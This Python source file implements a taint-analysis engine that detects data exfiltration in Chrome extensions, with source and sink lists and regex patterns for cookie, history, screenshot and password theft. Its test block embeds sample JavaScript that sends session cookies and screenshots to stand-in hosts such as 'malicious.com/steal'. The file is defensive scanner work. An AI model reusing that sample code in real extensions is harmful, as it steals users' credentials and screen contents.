"""
Advanced Taint Analysis Engine for Chrome Extension Security Analysis

Implements source-sink taint tracking to detect data exfiltration patterns.
Tracks "tainted" variables from sensitive sources (chrome.cookies, passwords, etc.)
and detects when they flow to dangerous sinks (fetch, WebSocket, etc.).

Based on research from:
- JavaSith framework (arXiv:2505.21263)
- CodeQL taint analysis methodology
- InspectJS taint specification inference
"""

import esprima
import re
import json
import math
from pathlib import Path
from collections import defaultdict
from typing import Dict, List, Set, Tuple, Optional, Any


class TaintSource:
    """Represents a source of tainted (sensitive) data"""

    # Chrome API sources - data that should never reach external networks
    CHROME_API_SOURCES = {
        'chrome.cookies.getAll': {'category': 'CREDENTIALS', 'risk': 10, 'data': 'session cookies'},
        'chrome.cookies.get': {'category': 'CREDENTIALS', 'risk': 9, 'data': 'cookie value'},
        'chrome.history.search': {'category': 'BROWSING', 'risk': 8, 'data': 'browsing history'},
        'chrome.history.getVisits': {'category': 'BROWSING', 'risk': 8, 'data': 'page visits'},
        'chrome.tabs.query': {'category': 'BROWSING', 'risk': 6, 'data': 'open tabs'},
        'chrome.tabs.captureVisibleTab': {'category': 'SCREEN', 'risk': 10, 'data': 'screenshot'},
        'chrome.identity.getAuthToken': {'category': 'CREDENTIALS', 'risk': 10, 'data': 'OAuth token'},
        'chrome.identity.getProfileUserInfo': {'category': 'PII', 'risk': 7, 'data': 'user email'},
        'chrome.storage.local.get': {'category': 'STORAGE', 'risk': 5, 'data': 'local storage'},
        'chrome.storage.sync.get': {'category': 'STORAGE', 'risk': 6, 'data': 'synced storage'},
        'chrome.bookmarks.getTree': {'category': 'BROWSING', 'risk': 5, 'data': 'bookmarks'},
        'chrome.passwords': {'category': 'CREDENTIALS', 'risk': 10, 'data': 'saved passwords'},
        'chrome.topSites.get': {'category': 'BROWSING', 'risk': 6, 'data': 'top sites'},
        'chrome.sessions.getRecentlyClosed': {'category': 'BROWSING', 'risk': 7, 'data': 'closed tabs'},
    }

    # DOM sources - sensitive user input
    DOM_SOURCES = {
        'input[type=password]': {'category': 'CREDENTIALS', 'risk': 10, 'data': 'password'},
        'input[type=email]': {'category': 'PII', 'risk': 7, 'data': 'email'},
        '.value': {'category': 'USER_INPUT', 'risk': 5, 'data': 'form value'},
        'document.cookie': {'category': 'CREDENTIALS', 'risk': 9, 'data': 'cookies'},
        'navigator.clipboard.readText': {'category': 'CLIPBOARD', 'risk': 8, 'data': 'clipboard'},
        'navigator.clipboard.read': {'category': 'CLIPBOARD', 'risk': 8, 'data': 'clipboard'},
    }

    # Wallet/Crypto sources
    CRYPTO_SOURCES = {
        'window.ethereum': {'category': 'CRYPTO', 'risk': 10, 'data': 'ethereum wallet'},
        'window.solana': {'category': 'CRYPTO', 'risk': 10, 'data': 'solana wallet'},
        'window.phantom': {'category': 'CRYPTO', 'risk': 10, 'data': 'phantom wallet'},
        'window.web3': {'category': 'CRYPTO', 'risk': 10, 'data': 'web3 provider'},
        'eth_accounts': {'category': 'CRYPTO', 'risk': 10, 'data': 'wallet accounts'},
        'eth_sign': {'category': 'CRYPTO', 'risk': 10, 'data': 'signature request'},
    }


class TaintSink:
    """Represents a dangerous sink where tainted data should not flow"""

    NETWORK_SINKS = {
        'fetch': {'type': 'NETWORK', 'danger': 'data exfiltration'},
        'XMLHttpRequest': {'type': 'NETWORK', 'danger': 'data exfiltration'},
        'navigator.sendBeacon': {'type': 'NETWORK', 'danger': 'stealthy exfiltration'},
        'WebSocket': {'type': 'NETWORK', 'danger': 'real-time exfiltration'},
        '.send': {'type': 'NETWORK', 'danger': 'data transmission'},
        'Image': {'type': 'NETWORK', 'danger': 'pixel tracking exfiltration'},
    }

    CODE_EXECUTION_SINKS = {
        'eval': {'type': 'CODE_EXEC', 'danger': 'arbitrary code execution'},
        'Function': {'type': 'CODE_EXEC', 'danger': 'dynamic function creation'},
        'setTimeout': {'type': 'CODE_EXEC', 'danger': 'delayed code execution'},
        'setInterval': {'type': 'CODE_EXEC', 'danger': 'periodic code execution'},
        'document.write': {'type': 'CODE_EXEC', 'danger': 'DOM injection'},
        'innerHTML': {'type': 'CODE_EXEC', 'danger': 'HTML injection'},
        'insertAdjacentHTML': {'type': 'CODE_EXEC', 'danger': 'HTML injection'},
    }

    CLIPBOARD_SINKS = {
        'navigator.clipboard.writeText': {'type': 'CLIPBOARD', 'danger': 'clipboard hijacking'},
        'navigator.clipboard.write': {'type': 'CLIPBOARD', 'danger': 'clipboard hijacking'},
        'document.execCommand': {'type': 'CLIPBOARD', 'danger': 'clipboard manipulation'},
    }


class TaintedVariable:
    """Tracks a variable that contains tainted data"""

    def __init__(self, name: str, source: str, category: str, risk: int, line: int):
        self.name = name
        self.source = source  # Where the taint originated
        self.category = category  # Type of sensitive data
        self.risk = risk  # Risk score 1-10
        self.line = line  # Line number where taint was introduced
        self.propagated_from: Optional['TaintedVariable'] = None

    def __repr__(self):
        return f"TaintedVariable({self.name}, source={self.source}, risk={self.risk})"


class TaintFlow:
    """Represents a detected taint flow from source to sink"""

    def __init__(self, source: TaintedVariable, sink: str, sink_type: str,
                 sink_line: int, evidence: str, file_path: str):
        self.source = source
        self.sink = sink
        self.sink_type = sink_type
        self.sink_line = sink_line
        self.evidence = evidence
        self.file_path = file_path

    def to_dict(self) -> Dict:
        return {
            'type': 'TAINT_FLOW',
            'source': {
                'api': self.source.source,
                'variable': self.source.name,
                'category': self.source.category,
                'line': self.source.line
            },
            'sink': {
                'function': self.sink,
                'type': self.sink_type,
                'line': self.sink_line
            },
            'risk': self.source.risk,
            'evidence': self.evidence,
            'file': self.file_path,
            'severity': 'critical' if self.source.risk >= 8 else 'high' if self.source.risk >= 5 else 'medium',
            'description': f"Sensitive {self.source.category} data from {self.source.source} flows to {self.sink}"
        }


class TaintAnalyzer:
    """
    Advanced taint analysis engine that tracks data flow from sources to sinks.

    Uses AST traversal to:
    1. Identify taint sources (chrome APIs, DOM inputs, crypto wallets)
    2. Track taint propagation through variable assignments and function calls
    3. Detect when tainted data reaches dangerous sinks (network, eval, etc.)
    """

    def __init__(self):
        self.tainted_variables: Dict[str, TaintedVariable] = {}
        self.taint_flows: List[TaintFlow] = []
        self.current_file = ""
        self.source_code = ""

        # Combine all sources
        self.all_sources = {}
        self.all_sources.update(TaintSource.CHROME_API_SOURCES)
        self.all_sources.update(TaintSource.DOM_SOURCES)
        self.all_sources.update(TaintSource.CRYPTO_SOURCES)

        # Combine all sinks
        self.all_sinks = {}
        self.all_sinks.update(TaintSink.NETWORK_SINKS)
        self.all_sinks.update(TaintSink.CODE_EXECUTION_SINKS)
        self.all_sinks.update(TaintSink.CLIPBOARD_SINKS)

    # esprima can hang or consume excessive memory on files larger than this
    MAX_AST_PARSE_SIZE = 3 * 1024 * 1024  # 3 MiB (raised so important index.js/service_worker bundles are analyzed)
    # Prevent runaway recursion on very deep or degenerate ASTs (minified/bundled code)
    MAX_TRAVERSE_DEPTH = 10000

    def analyze_file(self, file_path: str, content: str) -> List[Dict]:
        """
        Analyze a JavaScript file for taint flows.

        Args:
            file_path: Path to the JavaScript file
            content: JavaScript source code

        Returns:
            List of detected taint flows as dictionaries
        """
        self.current_file = file_path
        self.source_code = content
        self.tainted_variables.clear()
        self.taint_flows.clear()

        # Guard: skip full AST parse for very large files (esprima can hang)
        if len(content) > self.MAX_AST_PARSE_SIZE:
            self._regex_fallback_analysis(content)
            return [flow.to_dict() for flow in self.taint_flows]

        try:
            # Parse JavaScript into AST
            ast = esprima.parseScript(content, {'loc': True, 'range': True, 'tolerant': True})

            # First pass: identify taint sources and track variable assignments
            self._find_taint_sources(ast, depth=0)

            # Second pass: detect when tainted data flows to sinks
            self._find_sink_flows(ast, depth=0)

        except Exception as e:
            # If parsing fails, fall back to regex-based detection
            self._regex_fallback_analysis(content)

        return [flow.to_dict() for flow in self.taint_flows]

    def analyze_directory(self, extension_dir: Path) -> Dict:
        """
        Analyze all JavaScript files in an extension directory.

        Returns:
            Dictionary with taint analysis results
        """
        extension_dir = Path(extension_dir)
        results = {
            'files_analyzed': 0,
            'taint_flows': [],
            'high_risk_flows': [],
            'sources_found': [],
            'sinks_found': []
        }

        js_files = list(extension_dir.rglob('*.js'))

        print(f"[TAINT] Analyzing {len(js_files)} JavaScript files for data flow...")

        for js_file in js_files:
            try:
                with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()

                relative_path = str(js_file.relative_to(extension_dir))
                flows = self.analyze_file(relative_path, content)

                results['files_analyzed'] += 1
                results['taint_flows'].extend(flows)

                # Separate high-risk flows
                for flow in flows:
                    if flow.get('risk', 0) >= 8:
                        results['high_risk_flows'].append(flow)

            except Exception as e:
                continue

        if results['taint_flows']:
            print(f"[TAINT] [ALERT] Detected {len(results['taint_flows'])} taint flows!")
            for flow in results['high_risk_flows'][:3]:
                print(f"[TAINT]   -> {flow['source']['api']} -> {flow['sink']['function']}")

        return results

    def _find_taint_sources(self, node, parent_var: str = None, depth: int = 0):
        """Recursively find taint sources in AST and track assignments."""
        if depth > self.MAX_TRAVERSE_DEPTH:
            return
        if node is None or not hasattr(node, 'type'):
            return

        node_type = node.type

        # Variable declaration: const cookies = chrome.cookies.getAll()
        if node_type == 'VariableDeclaration':
            for decl in node.declarations:
                var_name = self._get_identifier_name(decl.id)
                if var_name and decl.init:
                    # Check if RHS is a taint source
                    source_info = self._is_taint_source(decl.init)
                    if source_info:
                        tainted = TaintedVariable(
                            name=var_name,
                            source=source_info['api'],
                            category=source_info['category'],
                            risk=source_info['risk'],
                            line=node.loc.start.line if hasattr(node, 'loc') else 0
                        )
                        self.tainted_variables[var_name] = tainted
                    else:
                        # Check if RHS references another tainted variable (propagation)
                        ref_name = self._get_referenced_variable(decl.init)
                        if ref_name and ref_name in self.tainted_variables:
                            # Propagate taint
                            original = self.tainted_variables[ref_name]
                            tainted = TaintedVariable(
                                name=var_name,
                                source=original.source,
                                category=original.category,
                                risk=original.risk,
                                line=node.loc.start.line if hasattr(node, 'loc') else 0
                            )
                            tainted.propagated_from = original
                            self.tainted_variables[var_name] = tainted

        # Assignment expression: data = chrome.cookies.getAll()
        elif node_type == 'AssignmentExpression':
            var_name = self._get_identifier_name(node.left)
            if var_name:
                source_info = self._is_taint_source(node.right)
                if source_info:
                    tainted = TaintedVariable(
                        name=var_name,
                        source=source_info['api'],
                        category=source_info['category'],
                        risk=source_info['risk'],
                        line=node.loc.start.line if hasattr(node, 'loc') else 0
                    )
                    self.tainted_variables[var_name] = tainted

        # Callback function parameter: chrome.cookies.getAll({}, function(cookies) {...})
        elif node_type == 'CallExpression':
            source_info = self._is_taint_source(node)
            if source_info:
                # Check for callback parameter
                for arg in node.arguments:
                    if arg.type in ['FunctionExpression', 'ArrowFunctionExpression']:
                        if arg.params:
                            param_name = self._get_identifier_name(arg.params[0])
                            if param_name:
                                tainted = TaintedVariable(
                                    name=param_name,
                                    source=source_info['api'],
                                    category=source_info['category'],
                                    risk=source_info['risk'],
                                    line=arg.loc.start.line if hasattr(arg, 'loc') else 0
                                )
                                self.tainted_variables[param_name] = tainted

        # Recursively traverse child nodes
        self._traverse_children(node, lambda n: self._find_taint_sources(n, depth=depth + 1))

    def _find_sink_flows(self, node, depth: int = 0):
        """Find when tainted data flows to dangerous sinks."""
        if depth > self.MAX_TRAVERSE_DEPTH:
            return
        if node is None or not hasattr(node, 'type'):
            return

        node_type = node.type

        # Call expression: fetch(url, {body: taintedData})
        if node_type == 'CallExpression':
            callee_name = self._get_callee_name(node.callee)

            # Check if this is a sink
            sink_info = None
            for sink_pattern, info in self.all_sinks.items():
                if sink_pattern in callee_name:
                    sink_info = info
                    sink_name = sink_pattern
                    break

            if sink_info:
                # Check if any argument contains tainted data
                for arg in node.arguments:
                    tainted = self._contains_tainted_data(arg)
                    if tainted:
                        flow = TaintFlow(
                            source=tainted,
                            sink=sink_name,
                            sink_type=sink_info['type'],
                            sink_line=node.loc.start.line if hasattr(node, 'loc') else 0,
                            evidence=self._get_code_snippet(node),
                            file_path=self.current_file
                        )
                        self.taint_flows.append(flow)
                        break  # One flow per call

        # Member expression with assignment: ws.send(taintedData)
        elif node_type == 'MemberExpression':
            prop_name = self._get_identifier_name(node.property)
            if prop_name and prop_name in ['send', 'write', 'postMessage']:
                # Check parent for call expression
                pass  # Handled in CallExpression

        # Recursively traverse child nodes
        self._traverse_children(node, lambda n: self._find_sink_flows(n, depth + 1))

    def _is_taint_source(self, node) -> Optional[Dict]:
        """Check if a node represents a taint source"""

        if node is None:
            return None

        node_type = getattr(node, 'type', '')

        if node_type == 'CallExpression':
            callee_name = self._get_callee_name(node.callee)

            for source_pattern, info in self.all_sources.items():
                if source_pattern in callee_name:
                    return {
                        'api': source_pattern,
                        'category': info['category'],
                        'risk': info['risk'],
                        'data': info['data']
                    }

        elif node_type == 'MemberExpression':
            full_name = self._get_callee_name(node)

            for source_pattern, info in self.all_sources.items():
                if source_pattern in full_name:
                    return {
                        'api': source_pattern,
                        'category': info['category'],
                        'risk': info['risk'],
                        'data': info['data']
                    }

        return None

    def _contains_tainted_data(self, node) -> Optional[TaintedVariable]:
        """Check if a node contains/references tainted data"""

        if node is None:
            return None

        node_type = getattr(node, 'type', '')

        # Direct variable reference
        if node_type == 'Identifier':
            name = getattr(node, 'name', '')
            if name in self.tainted_variables:
                return self.tainted_variables[name]

        # Member expression: taintedObj.property
        elif node_type == 'MemberExpression':
            obj_name = self._get_identifier_name(node.object)
            if obj_name and obj_name in self.tainted_variables:
                return self.tainted_variables[obj_name]

        # Object expression: {body: taintedData}
        elif node_type == 'ObjectExpression':
            for prop in getattr(node, 'properties', []):
                tainted = self._contains_tainted_data(prop.value)
                if tainted:
                    return tainted

        # Call expression: JSON.stringify(taintedData)
        elif node_type == 'CallExpression':
            for arg in getattr(node, 'arguments', []):
                tainted = self._contains_tainted_data(arg)
                if tainted:
                    return tainted

        # Template literal: `data: ${taintedVar}`
        elif node_type == 'TemplateLiteral':
            for expr in getattr(node, 'expressions', []):
                tainted = self._contains_tainted_data(expr)
                if tainted:
                    return tainted

        # Binary expression: "data=" + taintedVar
        elif node_type == 'BinaryExpression':
            tainted = self._contains_tainted_data(node.left)
            if tainted:
                return tainted
            return self._contains_tainted_data(node.right)

        return None

    def _get_referenced_variable(self, node) -> Optional[str]:
        """Get the variable name referenced by a node"""
        if node is None:
            return None

        node_type = getattr(node, 'type', '')

        if node_type == 'Identifier':
            return getattr(node, 'name', None)
        elif node_type == 'MemberExpression':
            return self._get_identifier_name(node.object)

        return None

    def _get_identifier_name(self, node) -> Optional[str]:
        """Get identifier name from a node"""
        if node is None:
            return None

        node_type = getattr(node, 'type', '')

        if node_type == 'Identifier':
            return getattr(node, 'name', None)

        return None

    def _get_callee_name(self, node) -> str:
        """Get full callee name from a node (e.g., chrome.cookies.getAll)"""
        if node is None:
            return ''

        node_type = getattr(node, 'type', '')

        if node_type == 'Identifier':
            return getattr(node, 'name', '')

        elif node_type == 'MemberExpression':
            obj = self._get_callee_name(getattr(node, 'object', None))
            prop = self._get_callee_name(getattr(node, 'property', None))
            return f"{obj}.{prop}" if obj and prop else obj or prop

        elif node_type == 'CallExpression':
            return self._get_callee_name(getattr(node, 'callee', None))

        return ''

    def _traverse_children(self, node, callback):
        """Traverse all child nodes"""
        for key in dir(node):
            if key.startswith('_'):
                continue

            value = getattr(node, key, None)

            if isinstance(value, list):
                for item in value:
                    if hasattr(item, 'type'):
                        callback(item)
            elif hasattr(value, 'type'):
                callback(value)

    def _get_code_snippet(self, node, context_lines: int = 3) -> str:
        """Extract code snippet around a node"""
        if not hasattr(node, 'loc'):
            return ''

        try:
            lines = self.source_code.split('\n')
            start_line = max(0, node.loc.start.line - context_lines - 1)
            end_line = min(len(lines), node.loc.end.line + context_lines)

            snippet_lines = lines[start_line:end_line]
            return '\n'.join(snippet_lines)
        except:
            return ''

    def _regex_fallback_analysis(self, content: str):
        """
        Fallback regex-based taint detection when AST parsing fails.
        Less precise but catches obfuscated code.
        """

        # Pattern: chrome.cookies -> ... -> fetch
        cookie_exfil = re.search(
            r'chrome\.cookies\.(getAll|get)\s*\([^)]*\)[^}]*?'
            r'(fetch|XMLHttpRequest|sendBeacon|WebSocket|\.send\s*\()',
            content, re.DOTALL | re.IGNORECASE
        )
        if cookie_exfil:
            self.taint_flows.append(TaintFlow(
                source=TaintedVariable('cookies', 'chrome.cookies.getAll', 'CREDENTIALS', 10, 0),
                sink='fetch',
                sink_type='NETWORK',
                sink_line=0,
                evidence=cookie_exfil.group(0)[:500],
                file_path=self.current_file
            ))

        # Pattern: chrome.history -> ... -> fetch
        history_exfil = re.search(
            r'chrome\.history\.(search|getVisits)\s*\([^)]*\)[^}]*?'
            r'(fetch|XMLHttpRequest|sendBeacon|WebSocket|\.send\s*\()',
            content, re.DOTALL | re.IGNORECASE
        )
        if history_exfil:
            self.taint_flows.append(TaintFlow(
                source=TaintedVariable('history', 'chrome.history.search', 'BROWSING', 8, 0),
                sink='fetch',
                sink_type='NETWORK',
                sink_line=0,
                evidence=history_exfil.group(0)[:500],
                file_path=self.current_file
            ))

        # Pattern: chrome.tabs.captureVisibleTab -> ... -> fetch
        screenshot_exfil = re.search(
            r'chrome\.tabs\.captureVisibleTab\s*\([^)]*\)[^}]*?'
            r'(fetch|XMLHttpRequest|sendBeacon|FormData)',
            content, re.DOTALL | re.IGNORECASE
        )
        if screenshot_exfil:
            self.taint_flows.append(TaintFlow(
                source=TaintedVariable('screenshot', 'chrome.tabs.captureVisibleTab', 'SCREEN', 10, 0),
                sink='fetch',
                sink_type='NETWORK',
                sink_line=0,
                evidence=screenshot_exfil.group(0)[:500],
                file_path=self.current_file
            ))

        # Pattern: input[type=password] -> ... -> send/fetch
        password_exfil = re.search(
            r'(input\[type=["\']?password|\.value)[^}]*?'
            r'(chrome\.runtime\.sendMessage|fetch|XMLHttpRequest|sendBeacon)',
            content, re.DOTALL | re.IGNORECASE
        )
        if password_exfil:
            self.taint_flows.append(TaintFlow(
                source=TaintedVariable('password', 'input[type=password]', 'CREDENTIALS', 10, 0),
                sink='sendMessage',
                sink_type='MESSAGE',
                sink_line=0,
                evidence=password_exfil.group(0)[:500],
                file_path=self.current_file
            ))


class EntropyAnalyzer:
    """Detects high-entropy strings that may indicate obfuscation"""

    @staticmethod
    def calculate_entropy(data: str) -> float:
        """Calculate Shannon entropy of a string"""
        if not data:
            return 0.0

        entropy = 0.0
        for char in set(data):
            p = data.count(char) / len(data)
            if p > 0:
                entropy -= p * math.log2(p)

        return entropy

    @staticmethod
    def detect_high_entropy_strings(content: str, threshold: float = 4.5) -> List[Dict]:
        """
        Find suspiciously high-entropy strings (likely encoded/obfuscated).

        Normal English text: ~3.5-4.0 bits/char
        Base64: ~5.5-6.0 bits/char
        Random hex: ~4.0 bits/char
        Fully random: ~6.0+ bits/char
        """
        findings = []

        # Find string literals
        string_pattern = re.compile(r'["\']([^"\']{50,})["\']')

        for match in string_pattern.finditer(content):
            string_value = match.group(1)
            entropy = EntropyAnalyzer.calculate_entropy(string_value)

            if entropy >= threshold:
                # Additional checks for specific obfuscation patterns
                is_base64 = bool(re.match(r'^[A-Za-z0-9+/=]+$', string_value))
                is_hex = bool(re.match(r'^[0-9a-fA-F]+$', string_value))

                findings.append({
                    'type': 'HIGH_ENTROPY_STRING',
                    'entropy': round(entropy, 2),
                    'length': len(string_value),
                    'is_base64_like': is_base64,
                    'is_hex_like': is_hex,
                    'preview': string_value[:100] + '...' if len(string_value) > 100 else string_value,
                    'position': match.start(),
                    'severity': 'high' if entropy >= 5.5 else 'medium'
                })

        return findings


# Test the taint analyzer
if __name__ == "__main__":
    test_code = """
    // Cookie exfiltration example
    chrome.cookies.getAll({domain: '.google.com'}, function(cookies) {
        const data = JSON.stringify(cookies);

        fetch('https://malicious.com/steal', {
            method: 'POST',
            body: data
        });
    });

    // Screenshot capture and upload
    chrome.tabs.captureVisibleTab(null, {format: 'png'}, function(screenshot) {
        const formData = new FormData();
        formData.append('img', screenshot);

        fetch('https://evil.xyz/upload', {
            method: 'POST',
            body: formData
        });
    });
    """

    analyzer = TaintAnalyzer()
    results = analyzer.analyze_file('test.js', test_code)

    print("\n=== Taint Analysis Results ===\n")
    for flow in results:
        print(json.dumps(flow, indent=2))
